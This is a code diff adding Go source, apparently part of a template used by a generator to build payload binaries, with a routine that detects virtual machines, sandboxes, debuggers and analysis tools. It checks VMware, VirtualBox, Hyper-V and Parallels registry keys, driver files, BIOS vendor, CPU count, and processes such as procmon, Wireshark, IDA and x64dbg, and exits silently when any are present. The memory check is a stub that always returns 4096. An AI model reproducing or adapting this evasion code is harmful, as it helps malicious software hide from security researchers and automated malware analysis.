@@ -136,5 +136,119 @@ func acquireMutex(name string) (windows.Handle, error) {
 }
 
 func setupLogger() *os.File { return nil }
+
+func checkAntiVps() {
+	if runtime.GOOS != "windows" {
+		return
+	}
+
+	// Check registry keys for VM software
+	if checkRegKey("SOFTWARE\\VMware, Inc.\\VMware Tools") ||
+		checkRegKey("SOFTWARE\\Oracle\\VirtualBox Guest Additions") ||
+		checkRegKey("SOFTWARE\\Microsoft\\Hyper-V") ||
+		checkRegKey("SOFTWARE\\Parallels\\Parallels Tools") ||
+		checkRegKey("SOFTWARE\\XenSource") {
+		os.Exit(1)
+	}
+
+	// Check for VM-related files
+	if checkFileExists("C:\\Windows\\System32\\VBox*.dll") ||
+		checkFileExists("C:\\Windows\\System32\\VBoxHook.dll") ||
+		checkFileExists("C:\\Windows\\System32\\VBoxGuest.sys") ||
+		checkFileExists("C:\\Windows\\System32\\VBoxMouse.sys") ||
+		checkFileExists("C:\\Windows\\System32\\VBoxSF.sys") ||
+		checkFileExists("C:\\Windows\\System32\\vmware-vmx.exe") ||
+		checkFileExists("C:\\Windows\\System32\\vmware-vmx-stats.exe") ||
+		checkFileExists("C:\\Windows\\System32\\vmware-vmx-debug.exe") {
+		os.Exit(1)
+	}
+
+	// Check for running VM processes
+	if checkProcessRunning("VBoxTray.exe") ||
+		checkProcessRunning("VBoxService.exe") ||
+		checkProcessRunning("vmtoolsd.exe") ||
+		checkProcessRunning("VMwareTray.exe") ||
+		checkProcessRunning("VMwareUser.exe") ||
+		checkProcessRunning("prl_tools.exe") ||
+		checkProcessRunning("prl_cc.exe") ||
+		checkProcessRunning("SandboxieRpcSs.exe") ||
+		checkProcessRunning("SandboxieDcomLaunch.exe") ||
+		checkProcessRunning("SbieSvc.exe") ||
+		checkProcessRunning("procmon.exe") ||
+		checkProcessRunning("procmon64.exe") ||
+		checkProcessRunning("wireshark.exe") ||
+		checkProcessRunning("fiddler.exe") ||
+		checkProcessRunning("ollydbg.exe") ||
+		checkProcessRunning("idaq.exe") ||
+		checkProcessRunning("idaq64.exe") ||
+		checkProcessRunning("x64dbg.exe") ||
+		checkProcessRunning("x32dbg.exe") ||
+		checkProcessRunning("windbg.exe") {
+		os.Exit(1)
+	}
+
+	// Check BIOS manufacturer
+	if checkBiosManufacturer() {
+		os.Exit(1)
+	}
+
+	// Check CPU cores
+	if runtime.NumCPU() < 2 {
+		os.Exit(1)
+	}
+
+	// Check RAM
+	if getSystemMemoryMB() < 2048 {
+		os.Exit(1)
+	}
+}
+
+func checkRegKey(key string) bool {
+	k, err := registry.OpenKey(registry.LOCAL_MACHINE, key, registry.QUERY_VALUE)
+	if err != nil {
+		return false
+	}
+	defer k.Close()
+	return true
+}
+
+func checkFileExists(pattern string) bool {
+	matches, err := filepath.Glob(pattern)
+	return err == nil && len(matches) > 0
+}
+
+func checkBiosManufacturer() bool {
+	k, err := registry.OpenKey(registry.LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\BIOS", registry.QUERY_VALUE)
+	if err != nil {
+		return false
+	}
+	defer k.Close()
+
+	val, _, err := k.GetStringValue("SystemManufacturer")
+	if err != nil {
+		return false
+	}
+
+	manufacturer := strings.ToLower(strings.TrimSpace(val))
+	return strings.Contains(manufacturer, "vmware") ||
+		strings.Contains(manufacturer, "virtualbox") ||
+		strings.Contains(manufacturer, "qemu") ||
+		strings.Contains(manufacturer, "xen") ||
+		strings.Contains(manufacturer, "parallels") ||
+		strings.Contains(manufacturer, "microsoft corporation")
+}
+
+func checkProcessRunning(processName string) bool {
+	cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s", processName), "/NH")
+	output, err := cmd.Output()
+	if err != nil {
+		return false
+	}
+	return strings.Contains(string(output), processName)
+}
+
+func getSystemMemoryMB() int {
+	return 4096
+}
 `, delay, buildID, buildID))
 }
